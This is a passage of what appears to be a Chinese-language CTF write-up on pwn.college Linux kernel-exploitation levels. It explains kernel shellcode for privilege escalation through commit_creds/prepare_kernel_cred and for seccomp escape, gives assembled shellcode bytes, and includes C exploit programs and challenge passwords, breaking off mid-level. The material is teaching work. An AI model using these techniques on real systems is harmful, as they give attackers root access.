*cmd)</span><br>&#123;<br>	<span class="hljs-type">char</span> **argv;<br>	<span class="hljs-type">static</span> <span class="hljs-type">char</span> *envp[] = &#123;<br>		<span class="hljs-string">&quot;HOME=/&quot;</span>,<br>		<span class="hljs-string">&quot;PATH=/sbin:/bin:/usr/sbin:/usr/bin&quot;</span>,<br>		<span class="hljs-literal">NULL</span><br>	&#125;;<br>	<span class="hljs-type">int</span> ret;<br>	argv = argv_split(GFP_KERNEL, cmd, <span class="hljs-literal">NULL</span>);<br>	<span class="hljs-keyword">if</span> (argv) &#123;<br>		ret = call_usermodehelper(argv[<span class="hljs-number">0</span>], argv, envp, UMH_WAIT_EXEC); <br>        <span class="hljs-comment">//UMH_WAIT_EXEC表示等待命令执行完成后再返回</span><br>		argv_free(argv);<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		ret = -ENOMEM;<br>	&#125;<br><br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<ul>
<li><code>kptr_restrict</code></li>
</ul>
<p>用来限制用户态读取内核指针的显示。</p>
<p>为0时, 未作任何处理, 直接输出, 这样对所有用户都没有限制；为1时, 中断上下文则不允许输出, 否则只有root用户才显示实际地址；为 2 时, 将指针直接置NULL, 这样所有用户都只能看到全0。</p>
<p>同时，在内核态格式化打印时，<code>%p</code>和<code>%pk</code>不输出实际地址而输出散列化地址;<code>%px</code>输出实际地址。</p>
<p>通过<code>/proc/sys/kernel/kptr_restrict</code>查看和修改该保护</p>
<ul>
<li><code>dmesg_restrict</code></li>
</ul>
<p>其值为0时，非特权用户对内核日志的查看将不受限制；值为1时，只有具有<code>CAP_SYSLOG</code>特权的用户(包括root用户)才能查看内核日志。</p>
<p>通过<code>/proc/sys/kernel/dmesg_restrict</code>查看和修改该保护</p>
<h3 id="Writing-Kernel-Shellcode"><a href="#Writing-Kernel-Shellcode" class="headerlink" title="Writing Kernel Shellcode"></a>Writing Kernel Shellcode</h3><p>系统调用是用户态和内核态的接口。<code>syscall</code>执行后会跳转到内核中的<code>syscall_entry</code>函数，和用户态一样使用<code>syscall</code>编写shellcode的方式在内核空间并不适用(内核线程崩溃,触发<code>segment fault</code>)。</p>
<p>在内核中，往往使用内核API和内核对象来达成我们的目标。</p>
<p>权限提升:</p>
<p><code>commit_creds(prepare_kernel_cred(0));</code></p>
<p>Seccomp沙箱逃逸:</p>
<p><code>current-&gt;thread_info.flags &amp;= ~(1 &lt;&lt; TIF_SECCOMP)</code></p>
<p>命令执行:</p>
<p><code>run_cmd(&quot;/path/to/my/command&quot;);</code></p>
<p>这些行为不包含<code>sysycall</code>,它们往往需要:</p>
<ul>
<li>找到<code>current_task_struct</code>以及其中的方法和成员的偏移</li>
<li>调用内核API函数比如：<code>prepare_kernel_cred</code>、<code>commit_creds</code>、<code>run_cmd</code></li>
</ul>
<p><strong>调用内核API</strong></p>
<p>传参而言，和用户态相同，依次使用<code>rdi、rsi、rdx、rcx、r8和r9</code>寄存器，返回值存放在<code>rax</code>中。</p>
<p>内核API是函数，必须使用<code>call</code>(而不是syscall)来调用它们。</p>
<p>但是不能直接call函数名，如<code>call prepare_kernel_creds</code>。由于编译器不知道函数的地址，这样做会产生重定位节(.rela.*)。</p>
<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">拓展:.rela.* 的作用是什么？<br>全称 relocation（重定位），记录编译器在编译时不确定的符号地址——针对引用的外部符号。<br><span class="hljs-keyword">dynamic</span> 段中保存了可执行文件依赖哪些动态库。<br>GOT 段记录了需要引用的外部符号的地址。<br></code></pre></td></tr></table></figure>

<ol>
<li>如何<code>call</code></li>
</ol>
<ul>
<li>相对地址call</li>
</ul>
<p>直接call立即数会把立即数看成一个32位的offset，跳转到当前地址+offset执行</p>
<ul>
<li>绝对地址call</li>
</ul>
<p>进行绝对地址调用可以把地址放到寄存器中再call，如下，跳转到0xffff414142424242执行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov rax,0xffff414142424242<br>call rax<br></code></pre></td></tr></table></figure>

<ol start="2">
<li>定位内核API</li>
</ol>
<ul>
<li>kASLR关闭时</li>
</ul>
<p>在root权限下可以通过查看<code>/proc/kallsyms</code>获取内核函数地址。如果没有目标机器的root权限但其关闭的kASLR，可以通过查看有root权限的相同系统(硬件、内核版本等)机器来获取，它们的内核函数地址往往是相同的，例如：在challenge中，如果没开启kASLR，则可以在<code>practice mode</code>获取<code>/proc/kallsyms</code>中该挑战的内核函数地址。</p>
<ul>
<li>kASLR开启时</li>
</ul>
<p>需要泄露出一个内核地址后找出该地址的偏移，计算内核基址，就像绕过用户态ASLR一样。</p>
<p><strong>Seccomp:寻找当前进程的<code>task struct</code>以及成员偏移</strong></p>
<p><code>gs</code>段寄存器指向<code>current task struct</code>，在c内核开发中，宏定义<code>current</code>可以获取<code>gs</code>寄存器的值。</p>
<p>编写shellcode时，自己计算结构体中的偏移是十分复杂的，可以通过编译对应的c源码后查看汇编得到需要的地址</p>
<ul>
<li>用c语言编写包含了shellcode中需要的内容的内核模块。</li>
<li>构建内核模块(在pwncollege的挑战中可以使用<code>vm build</code>命令)</li>
<li>逆向内核模块，查看汇编，将需要的内容提取至shellcode中</li>
</ul>
<p>例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//test_seccomp.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;linux/cred.h&gt;</span></span><br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL&quot;</span>);<br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">test_get_tread_info_flags_addr</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>	<span class="hljs-keyword">return</span> &amp;current-&gt;thread_info.flags; <br>&#125;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-title function_">test_get_seccomp_flag</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> TIF_SECCOMP;<br>&#125;<br><span class="hljs-comment">//vm build test_seccomp.c</span><br><span class="hljs-comment">//objdump -M intel -d /challenge/debug.ko</span><br></code></pre></td></tr></table></figure>

<p>但是在level8.0中发现该方法将<code>&amp;current-&gt;thread_info.flags</code>解析为了<code>mov    rax,QWORD PTR gs:0x0</code>，该偏移量是错误的。因为在长模式下，并没有真正使用分段，所有段寄存器的基数都是 0，而fs 和 gs 是为了解决线程特定数据而添加的例外。它们的真实基地址存储在MSR（模型特定寄存器）中，而不是描述符表中。MSR寄存器仅在内核可见，因此我们反编译用户态构建的内核模块无法获取相关偏移，真实偏移只能在内核态观察到，我们可以通过gdb调试内核中相关的函数寻找偏移。</p>
<p>具体获取偏移的方法请跳转至level8.0。</p>
<p><strong>内核shellcode编写及编译样例</strong></p>
<p>cred提权</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//shellcode.s</span><br>.intel_syntax noprefix<br><br>.section .text<br>.global _start<br><br>_start:<br>    xor rdi, rdi<br>    mov rcx, <span class="hljs-number">0xffffffff8107c0a0</span><br>    call rcx<br>    mov rdi, rax<br>    mov rcx, <span class="hljs-number">0xffffffff8107bd20</span><br>    call rcx<br>    ret<br><br><span class="hljs-comment">//gcc -c -o shellcode shellcode.s -masm=intel -nostdlib -Ttext=0</span><br><span class="hljs-comment">//使用自制linux使用工具 - bin2shellcode</span><br><span class="hljs-comment">//bin2shellcode shellcode</span><br><span class="hljs-comment">//shellcode = &quot;\x48\x31\xff\x48\xc7\xc1\xa0\xc0\x07\x81\xff\xd1\x48\x89\xc7\x48\xc7\xc1\x20\xbd\x07\x81\xff\xd1\xc3&quot;</span><br> <br></code></pre></td></tr></table></figure>



<p><strong>清理工作</strong></p>
<p>内核中shellcode的崩溃会造成严重的后果，因此需要使shellcode”干净”地结束，不造成混乱。  需要保证shellcode运行后内核中的服务也正常运行。</p>
<p>例：如果通过劫持函数指针来调用shellcode，那么shellcode必须表现得像一个函数并在结束时返回。</p>
<p><strong>内核调试</strong></p>
<p>大部分攻击会通过一个用户态程序(.&#x2F;attack)将payload注入到内核中触发bug。那么调试时如何运行gdb，将gdb附加到哪里呢？如果是实际硬件中运行的内核，需要使用专用硬件调试器进行附加调试。</p>
<ul>
<li>从qemu虚拟机中调试</li>
</ul>
<p>直接在vm中运行<code>gdb ./attack</code>，该方式能够带符号调试用户态程序，但是无法进入内核调试。当在<code>syscall</code>运行<code>si</code>时，会输出:<code>syscall instructions appearing to SIGSEGV/SIGKILL</code>等报错。</p>
<ul>
<li>从qemu虚拟机外调试</li>
</ul>
<p>使用gdb附加到qemu进行调试，具体步骤记录在<code>Environment setup</code>一节中。</p>
<p>在道场的挑战中可以使用<code>vm debug</code>命令</p>
<p>该方式不方便调试用户态程序(无符号表)，但是为调试内核本身的唯一方式。</p>
<ul>
<li><code>TL;DR</code>:<code>tldr</code>是一个类似<code>man</code>的手册查看命令，但是比man更简洁精炼。</li>
</ul>
<h2 id="challenges"><a href="#challenges" class="headerlink" title="challenges"></a>challenges</h2><h3 id="level1-0"><a href="#level1-0" class="headerlink" title="level1.0"></a>level1.0</h3><p>在workspace中将<code>.ko</code>文件下载到本地，用ida查看</p>
<p>init_module，在<code>/proc</code>目录下注册名为<code>pwncollege</code>的设备文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">init_module</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 v0; <span class="hljs-comment">// rbp</span><br><br>  v0 = filp_open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">memset</span>(flag, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(flag));<br>  kernel_read(v0, flag, <span class="hljs-number">128LL</span>, v0 + <span class="hljs-number">104</span>);<br>  filp_close(v0, <span class="hljs-number">0LL</span>);<br>  proc_entry = (proc_dir_entry *)proc_create(<span class="hljs-string">&quot;pwncollege&quot;</span>, <span class="hljs-number">0x1B6</span>LL, <span class="hljs-number">0LL</span>, &amp;fops);<br>  printk(&amp;unk_F91);<br>  printk(&amp;unk_D90);<br>  printk(&amp;unk_F91);<br>  printk(&amp;unk_DC0);<br>  printk(&amp;unk_E28);<br>  printk(&amp;unk_E88);<br>  printk(&amp;unk_ED8);<br>  printk(&amp;unk_F98);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>device_write，写设备文件时触发</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> __fastcall <span class="hljs-title function_">device_write</span><span class="hljs-params">(file *file, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *buffer, <span class="hljs-type">size_t</span> length, <span class="hljs-type">loff_t</span> *offset)</span><br>&#123;<br>  <span class="hljs-type">size_t</span> v5; <span class="hljs-comment">// rdx</span><br>  <span class="hljs-type">char</span> password[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-28h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// [rsp+10h] [rbp-18h]</span><br><br>  v8 = __readgsqword(<span class="hljs-number">0x28</span>u);<br>  printk(&amp;unk_D10);<br>  v5 = <span class="hljs-number">16LL</span>;<br>  <span class="hljs-keyword">if</span> ( length &lt;= <span class="hljs-number">0x10</span> )<br>    v5 = length;<br>  copy_from_user(password, buffer, v5);  <span class="hljs-comment">//从用户态获取password</span><br>  device_state[<span class="hljs-number">0</span>] = (<span class="hljs-built_in">strncmp</span>(password, <span class="hljs-string">&quot;lyyfrvygobfnvyml&quot;</span>, <span class="hljs-number">0x10</span>uLL) == <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">return</span> length;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>device_read，读设备文件时触发</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> __fastcall <span class="hljs-title function_">device_read</span><span class="hljs-params">(file *file, <span class="hljs-type">char</span> *buffer, <span class="hljs-type">size_t</span> length, <span class="hljs-type">loff_t</span> *offset)</span><br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v6; <span class="hljs-comment">// rsi</span><br>  <span class="hljs-type">size_t</span> v7; <span class="hljs-comment">// rdx</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// rax</span><br><br>  printk(&amp;unk_D50);<br>  v6 = flag;<br>  <span class="hljs-keyword">if</span> ( device_state[<span class="hljs-number">0</span>] != <span class="hljs-number">2</span> )<br>  &#123;<br>    v6 = <span class="hljs-string">&quot;device error: unknown state\n&quot;</span>;<br>    <span class="hljs-keyword">if</span> ( device_state[<span class="hljs-number">0</span>] &lt;= <span class="hljs-number">2</span> )<br>    &#123;<br>      v6 = <span class="hljs-string">&quot;password:\n&quot;</span>;<br>      <span class="hljs-keyword">if</span> ( device_state[<span class="hljs-number">0</span>] )<br>      &#123;<br>        v6 = <span class="hljs-string">&quot;device error: unknown state\n&quot;</span>;<br>        <span class="hljs-keyword">if</span> ( device_state[<span class="hljs-number">0</span>] == <span class="hljs-number">1</span> )<br>        &#123;<br>          device_state[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>          v6 = <span class="hljs-string">&quot;invalid password\n&quot;</span>;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>  v7 = length;<br>  v8 = <span class="hljs-built_in">strlen</span>(v6) + <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> ( v8 - <span class="hljs-number">1</span> &lt;= length )<br>    v7 = v8 - <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">return</span> v8 - <span class="hljs-number">1</span> - copy_to_user(buffer, v6, v7);<span class="hljs-comment">//从flag文件中读取length长度的数据到用户态buffer</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>没有涉及提权、逃逸之类的操作，掌握内核模块的注册、读写交互即可，注意open的第二个参数不能为0，否则无法write。</p>
<p>exp:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">char</span> buffer[<span class="hljs-number">100</span>];<br>  <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, O_RDWR);<br>  <span class="hljs-type">char</span> key[] = <span class="hljs-string">&quot;lyyfrvygobfnvyml&quot;</span>;<br>  write(fd, key, <span class="hljs-keyword">sizeof</span>(key));<br>  read(fd, buffer, <span class="hljs-number">100</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, buffer);<br>  close(fd);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="level1-1"><a href="#level1-1" class="headerlink" title="level1.1"></a>level1.1</h3><p>同样下载到本地用ida查看</p>
<p>在<code>/proc</code>下注册pwncollege设备</p>
<p><code>device_write</code>依然是获取password,<code>device_read</code>中代码进行了修改，但是效果不变。</p>
<p>以下代码是device_read中比较难分析的部分，但通过<a target="_blank" rel="noopener" href="https://maplebacon.org/2021/06/faustctf-treasury/">搜索引擎</a>可以发现这其实只是内联优化的静态<code>strlen</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( device_state[<span class="hljs-number">0</span>] == <span class="hljs-number">2</span> )<br>&#123;<br>  v8 = flag;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    v9 = *(_DWORD *)v8;<br>    v8 += <span class="hljs-number">4</span>;<br>    v10 = ~v9 &amp; (v9 - <span class="hljs-number">0x1010101</span>) &amp; <span class="hljs-number">0x80808080</span>;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( !v10 );<br>  v6 = flag;<br>  <span class="hljs-keyword">if</span> ( (~v9 &amp; (v9 - <span class="hljs-number">0x1010101</span>) &amp; <span class="hljs-number">0x8080</span>) == <span class="hljs-number">0</span> )<br>    v10 &gt;&gt;= <span class="hljs-number">16</span>;<br>  <span class="hljs-keyword">if</span> ( (~v9 &amp; (v9 - <span class="hljs-number">0x1010101</span>) &amp; <span class="hljs-number">0x8080</span>) == <span class="hljs-number">0</span> )<br>    v8 += <span class="hljs-number">2</span>;<br>  offset = (<span class="hljs-type">loff_t</span> *)v10;<br>  LOBYTE(offset) = <span class="hljs-number">2</span> * v10;<br>  v5 = v8 - &amp;flag[__CFADD__((_BYTE)v10, (_BYTE)v10) + <span class="hljs-number">3</span>];<br>  <span class="hljs-keyword">goto</span> LABEL_5;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>level1.0的exp改下key即可</p>
<p>exp:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>,O_RDWR);<br>    <span class="hljs-type">char</span> key[<span class="hljs-number">17</span>] = <span class="hljs-string">&quot;lqgfblpiidjtuaho&quot;</span>;<br>    <span class="hljs-type">char</span> flag[<span class="hljs-number">100</span>];<br>    write(fd,key,<span class="hljs-number">0x10</span>);<br>    read(fd,flag,<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,flag);<br>    <br>    close(fd);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="level2-0"><a href="#level2-0" class="headerlink" title="level2.0"></a>level2.0</h3><p>在<code>device_write</code>中检测password后通过<code>printk</code>将flag输出在内核日志中，内核日志通过<code>vm logs</code>查看。</p>
<p>exp:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>,O_RDWR);<br>    <span class="hljs-type">char</span> key[<span class="hljs-number">17</span>] = <span class="hljs-string">&quot;qkjzqcfqtnzctrsp&quot;</span>;<br>    write(fd,key,<span class="hljs-number">0x10</span>);<br>    close(fd);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="level2-1"><a href="#level2-1" class="headerlink" title="level2.1"></a>level2.1</h3><p>在<code>device_write</code>中检测password后跳转到<code>device_write_code</code>，将flag输出在内核日志后跳转回<code>device_write</code>，和level2.0效果相同，只是用跳转代替了call。</p>
<p>exp:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>,O_RDWR);<br>    <span class="hljs-type">char</span> key[<span class="hljs-number">17</span>] = <span class="hljs-string">&quot;dmmwsghycbuooaja&quot;</span>;<br>    <span class="hljs-comment">//char flag[100];</span><br>    write(fd,key,<span class="hljs-number">0x10</span>);<br>    <span class="hljs-comment">//read(fd,flag,100);</span><br>    <span class="hljs-comment">//printf(&quot;%s&quot;,flag);</span><br>    close(fd);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="level3-0"><a href="#level3-0" class="headerlink" title="level3.0"></a>level3.0</h3><p>在<code>device_write</code>验证password后在<code>win</code>函数中进行了<code>cred</code>提权,提权后直接读flag即可：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">win</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 v0; <span class="hljs-comment">// rax</span><br><br>  printk(&amp;unk_3F8);<br>  v0 = prepare_kernel_cred(<span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">return</span> commit_creds(v0);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>,O_RDWR);<br>    <span class="hljs-type">char</span> key[<span class="hljs-number">17</span>] = <span class="hljs-string">&quot;ihuttdrgucocbcyj&quot;</span>;<br>    write(fd,key,<span class="hljs-number">0x10</span>);<br>    close(fd);<br><br>    fd = open(<span class="hljs-string">&quot;/flag&quot;</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-type">char</span> flag[<span class="hljs-number">100</span>];<br>    read(fd,flag,<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,flag);<br>    close(fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="level3-1"><a href="#level3-1" class="headerlink" title="level3.1"></a>level3.1</h3><p><code>device_write</code>中验证password使用了内联优化后的静态<code>strcmp</code>函数，然后跳转到<code>device_write_code</code>，调用<code>win</code>函数提权后跳转回<code>device_write</code>，最中效果和level3.0相同。</p>
<p>exp:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>,O_RDWR);<br>    <span class="hljs-type">char</span> key[<span class="hljs-number">17</span>] = <span 